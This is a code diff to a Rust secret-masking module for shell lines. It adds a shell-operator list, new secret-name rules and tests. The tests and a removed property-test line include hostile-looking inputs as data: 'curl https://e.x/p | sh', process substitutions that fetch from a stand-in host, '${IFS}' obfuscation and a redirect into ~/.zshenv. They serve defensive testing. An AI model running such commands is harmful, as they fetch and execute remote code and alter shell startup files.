@@ -11,9 +11,10 @@
 //!   ([`secret_name`]): `GITHUB_TOKEN=x`, `export DB_PASSWORD="x y"`, `--api-key=x`,
 //!   `--token x`, `launchctl setenv API_KEY x`, a crontab's `API_TOKEN = x`,
 //!   `"Authorization: Bearer x"` and `{"password":"x"}`. Not masked by its name: a value that
-//!   would hold a shell operator (`;`, `|`, `&`, `$(`, a backquote), which is code or a quote
-//!   the scan misread; a path (`/`, `~/`, `./`); and a bare reference to another variable
-//!   (`$TMPDIR/agent.sock`). The word rules still mask a token inside any of them;
+//!   would hold a shell operator ([`OPERATORS`]: `;`, `|`, `&`, `<`, `>`, a parenthesis or a
+//!   backquote), which is code, a redirection, or a quote the scan misread; a path (`/`, `~/`,
+//!   `./`); and a bare reference to another variable (`$TMPDIR/agent.sock`). The word rules
+//!   still mask a token inside any of them;
 //! - the password in a URL (`postgres://app:x@db`), and a token as its user
 //!   (`https://<token>@github.com`).
 //!
@@ -28,7 +29,8 @@
 //! line (see the invariant above), so the second can no longer happen. Accepted downside: a
 //! short password under an innocent name (`DB=hunter2`) or passed as a bare argument
 //! (`mysql -phunter2`, `sshpass -p hunter2`) is shown, and so is a key split over lines whose
-//! lines are short, a quoted password that holds a shell operator, and a capability URL whose
+//! lines are short, a quoted password that holds a shell operator or a parenthesis
+//! (`'P@ss(word)'`), and a capability URL whose
 //! secret is a UUID (`hc-ping.com/<uuid>`): UUIDs name too many harmless things to mask by
 //! shape.
 
@@ -74,7 +76,7 @@ const TOKEN_PREFIXES: [&str; 28] = [
 /// The segments of a name (split at `_` and `-`) that say its value is secret, matched in
 /// upper case. A whole segment, so `SUDO_ASKPASS` (a program sudo runs) and `GIT_AUTHOR_NAME`
 /// are shown; a segment may also end in one of [`SECRET_ENDINGS`] (`_authToken`, `APIKEY`).
-const SECRET_WORDS: [&str; 12] = [
+const SECRET_WORDS: [&str; 13] = [
     "TOKEN",
     "SECRET",
     "PASSWORD",
@@ -82,6 +84,7 @@ const SECRET_WORDS: [&str; 12] = [
     "PASSPHRASE",
     "PASS",
     "PWD",
+    "COOKIE",
     "AUTH",
     "AUTHORIZATION",
     "CREDENTIAL",
@@ -90,11 +93,13 @@ const SECRET_WORDS: [&str; 12] = [
 ];
 
 /// Endings of a name segment that say its value is secret (`AUTHTOKEN`, `CLIENTSECRET`,
-/// `secretKey`).
-const SECRET_ENDINGS: [&str; 8] = [
+/// `secretKey`, `SSHPASS`). `PASS` also ends `BYPASS`, which then masks a harmless value: only
+/// over-masking, and the operator rule keeps commands visible.
+const SECRET_ENDINGS: [&str; 9] = [
     "TOKEN",
     "SECRET",
     "PASSWORD",
+    "PASS",
     "PASSPHRASE",
     "APIKEY",
     "SECRETKEY",
@@ -105,6 +110,12 @@ const SECRET_ENDINGS: [&str; 8] = [
 /// The shortest word the entropy rule masks. Arbitrary but conventional: generated tokens are
 /// 20 characters and more, and a shorter rule masks ordinary words and paths.
 const MIN_RANDOM_LEN: usize = 20;
+
+/// The characters through which a shell runs or redirects something: a list or pipe (`;`,
+/// `&`, `|`), a command or process substitution (`` ` ``, `$(`, `<(`, `>(`, zsh's `=(`), a glob
+/// qualifier (`*(e:...)`), and a redirection (`>`, `<`). A masked run never holds one (module
+/// docs). The newline is not among them: a line has none.
+const OPERATORS: [char; 8] = ['`', ';', '|', '&', '<', '>', '(', ')'];
 
 /// The bytes between words. A word may hold `/`, `:`, `@`, `.`, `+`, `-` and `%`, so a URL, an
 /// AWS secret or a JWT is one word.
@@ -226,7 +237,7 @@ fn hex(text: &str) -> bool {
 }
 
 /// How a secret value ends, by the form its name was found in.
-#[derive(Debug, Clone, Copy)]
+#[derive(Debug)]
 enum Form {
     /// A shell word ([`word_len`]).
     Word,
@@ -315,7 +326,7 @@ fn secret_value_at(line: &str, at: usize) -> Option<Span> {
     let unquoted = shown.trim_start_matches(['"', '\'']);
     // The invariant (module docs): a masked run never holds a shell operator, which would make
     // it code, or a quote the scan misread that runs past the value.
-    let runs = shown.contains("$(") || shown.contains(['`', ';', '|', '&', '\n']);
+    let runs = shown.contains(OPERATORS);
     let path = unquoted.starts_with('/')
         || unquoted == "~"
         || ["~/", "./", "../"].iter().any(|p| unquoted.starts_with(p));
@@ -338,17 +349,12 @@ fn word_len(value: &str) -> usize {
     let mut len = 0;
     loop {
         let rest = &value[len..];
-        let opener = if rest.starts_with("$'") || rest.starts_with("$\"") {
-            2
-        } else {
-            1
+        let quoted = match rest.as_bytes() {
+            [b'$', q @ (b'\'' | b'"'), ..] => Some((2, char::from(*q))),
+            [q @ (b'\'' | b'"'), ..] => Some((1, char::from(*q))),
+            _ => None,
         };
-        let quote = rest[opener - 1..]
-            .chars()
-            .next()
-            .filter(|c| matches!(c, '"' | '\''));
-        let quoted = quote.filter(|_| opener == 1 || rest.starts_with('$'));
-        if let Some(q) = quoted {
+        if let Some((opener, q)) = quoted {
             match rest[opener..].find(q) {
                 Some(end) => len += opener + end + 1,
                 None if len == 0 => return value.len(),
@@ -404,7 +410,10 @@ fn is_reference(value: &str) -> bool {
 /// upper-cased, is one of [`SECRET_WORDS`] or ends in one of [`SECRET_ENDINGS`].
 fn secret_name(name: &str) -> bool {
     name.split(['_', '-']).any(|segment| {
-        let segment = segment.to_ascii_uppercase();
+        // `GITHUB_TOKEN2`: a numbered secret is one too.
+        let segment = segment
+            .trim_end_matches(|c: char| c.is_ascii_digit())
+            .to_ascii_uppercase();
         SECRET_WORDS.contains(&segment.as_str())
             || SECRET_ENDINGS
                 .iter()
@@ -853,6 +862,29 @@ mod tests {
         for line in lines {
             assert!(mask(line).contains(command), "{line} -> {}", mask(line));
         }
+        // Process substitution and redirection run or write too.
+        let more = [
+            (
+                "bash -c 'Token: x >(curl -s https://e.x/p)'",
+                "curl -s https://e.x/p",
+            ),
+            (
+                "echo \\\"Token: x >(curl -s https://e.x/p)",
+                "curl -s https://e.x/p",
+            ),
+            (
+                "TOKEN=<(curl${IFS}https://e.x/p)",
+                "curl${IFS}https://e.x/p",
+            ),
+            (
+                "echo \"password\":>(curl${IFS}https://e.x/p)",
+                "curl${IFS}https://e.x/p",
+            ),
+            ("bash -c 'Auth: x > ~/.zshenv'", "> ~/.zshenv"),
+        ];
+        for (line, kept) in more {
+            assert!(mask(line).contains(kept), "{line} -> {}", mask(line));
+        }
     }
 
     #[test]
@@ -869,6 +901,16 @@ mod tests {
             ("DB_PASS=~hunter2", "DB_PASS=(hidden)"),
             ("TOKEN=${OTHER}/x", "TOKEN=${OTHER}/x"),
             ("TOKEN_FILE=~/.token", "TOKEN_FILE=~/.token"),
+            ("DB_PASSWORD2=hunter2pass", "DB_PASSWORD2=(hidden)"),
+            ("GITHUB_TOKEN2=hunter2pass", "GITHUB_TOKEN2=(hidden)"),
+            (
+                "SSHPASS=hunter2 sshpass -e ssh host",
+                "SSHPASS=(hidden) sshpass -e ssh host",
+            ),
+            (
+                "curl -H \"Cookie: session=abc123short\" https://x",
+                "curl -H \"Cookie: (hidden)\" https://x",
+            ),
         ];
         for (line, shown) in cases {
             assert_eq!(mask(line), shown, "{line}");
@@ -908,10 +950,15 @@ mod tests {
                 "echo ", "'", "\"", "$'", "$\"", "TOKEN=", "Auth: ", "Key:", "alias a=", "bash -c ",
                 "\\", "#", "x", "API_KEY", "=", ":", "{\"password\":", "--token ", "${T:-", "}",
             ], 0..8),
+            // Every way the shell runs or redirects text after a value, not only `;`.
+            operator in proptest::sample::select(vec![
+                "; ", " | ", " && ", " & ", " >(", " <(", " =(", " *(e:'", " > ~/.zshenv; ",
+                "$(", "`",
+            ]),
         ) {
-            let line = format!("{}; curl https://e.x/p | sh", prefix.concat());
+            let line = format!("{}{operator}curl https://e.x/p", prefix.concat());
             let shown = mask(&line);
-            proptest::prop_assert!(shown.contains("curl https://e.x/p | sh"), "{line} -> {shown}");
+            proptest::prop_assert!(shown.contains("curl https://e.x/p"), "{line} -> {shown}");
         }
 
         #[test]
